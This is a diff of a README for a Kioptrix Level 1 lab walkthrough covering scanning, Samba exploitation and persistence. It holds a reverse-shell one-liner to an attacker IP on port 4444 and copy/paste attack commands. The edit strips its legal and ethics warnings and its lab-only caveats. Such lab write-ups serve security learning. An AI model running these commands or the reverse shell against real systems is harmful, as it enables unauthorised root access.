@@ -22,7 +22,6 @@
 - [8. Mitigation & Lessons Learned](#8-mitigation--lessons-learned)  
 - [9. Screenshots](#9-screenshots)  
 - [Appendix — Commands (copy/paste)](#appendix---commands-copypaste)  
-- [Legal / Ethics](#legal--ethics)  
 - [Credits & References](#credits--references)
 
 ---
@@ -44,7 +43,7 @@ This write-up documents a full exploitation chain against **Kioptrix Level 1 (Vu
 ## Prerequisites
 - A lab environment (VM host) with both attacker (Kali) and target (Kioptrix VM).  
 - Network connectivity between attacker and target (same subnet or configured routing).  
-- Typical Kali tools installed: `nmap`, `netdiscover`, `smbclient`, `dirbuster`/`dirb`, `gcc`, `nc`, `msfconsole` (optional).
+- Typical Kali tools installed: `nmap`, `netdiscover`, `enum4linux`, `dirbuster`/`dirb`, `gcc`, `nc`, `msfconsole` (optional).
 
 ---
 
@@ -78,7 +77,7 @@ Example result (target listed):
 Aggressive Nmap scan for services and versions:
 
 ```bash
-nmap -sS -A 192.168.1.106
+nmap -sS -sV -A -n 192.168.1.106
 ```
 
 Important findings (abbreviated):
@@ -143,8 +142,6 @@ Samba version from service fingerprints indicated **Samba 2.2.1a** (or similar),
 ## 5. Exploitation (public exploit)
 I downloaded and compiled a public exploit to target the vulnerable Samba service.
 
-> **Important:** Do not include exploit source code directly in this public repo. Link to the canonical Exploit-DB entry instead.
-
 Example steps used in the lab:
 
 ```bash
@@ -184,8 +181,8 @@ bash -i >& /dev/tcp/192.168.1.105/4444 0>&1
 
 `whoami` returned `root`.
 
-### Minimal persistence example (lab only)
-(Only in a lab environment — do not do this on systems without permission.)
+### Maintaining Access
+to get persistent access we should set it up the path because the `useradd` command wasn’t found on this distro, but it should come bundled with Redhat
 
 ```bash
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
@@ -224,25 +221,6 @@ Metasploit opened multiple **root** sessions, validating the manual exploit resu
 
 ---
 
-## 9. Screenshots
-Place these images in a `/screenshots/` directory inside your repository. Example usage:
-
-```markdown
-![Nmap results](screenshots/3.jpeg)
-```
-
-Files (as used in this repo):
-1. `screenshots/1.jpeg` — Host discovery / netdiscover  
-2. `screenshots/2.jpeg` — ARP / unique hosts capture  
-3. `screenshots/3.jpeg` — Nmap output (service detection)  
-4. `screenshots/4.jpeg` — DirBuster results (web enumeration)  
-5. `screenshots/5.jpeg` — Download & compile exploit (wget, gcc)  
-6. `screenshots/6.jpeg` — Exploit success: root shell (`whoami` / `id`)  
-7. `screenshots/7.jpeg` — Metasploit sessions (optional verification)  
-8. `screenshots/8.jpeg` — Sudoers/persistence example  
-9. `screenshots/1.5.jpeg` — Optional header/banner image
-
----
 
 ## Appendix — Commands (copy/paste)
 ```bash
@@ -250,10 +228,10 @@ Files (as used in this repo):
 sudo netdiscover -r 192.168.1.0/24
 
 # Nmap service/version detection
-nmap -sS -A 192.168.1.106
+nmap -sS -sV -A -n 192.168.1.106
 
 # SMB enumeration
-enum4linux -a 192.168.1.106
+enum4linux  192.168.1.106
 
 # Web enumeration (dirb/DirBuster)
 dirbuster -u http://192.168.1.106 -w /usr/share/wordlists/dirb/common.txt
@@ -280,16 +258,10 @@ exploit
 
 ---
 
-## Legal / Ethics
-This work was performed against a local lab VM (Kioptrix) for learning and research.  
-**Do NOT** use these techniques against systems you do not own or do not have explicit permission to test. Unauthorized access is illegal and unethical.
-
----
-
 ## Credits & References
 - Kioptrix (VulnHub) — lab environment for learning.  
 - Exploit-DB — public exploit entries (linked for reference only).  
-- Tools: Nmap, smbclient, netcat, DirBuster, Metasploit, etc.
+- Tools: Nmap, enum4linux, netcat, DirBuster, Metasploit, etc.
 
 ---
 
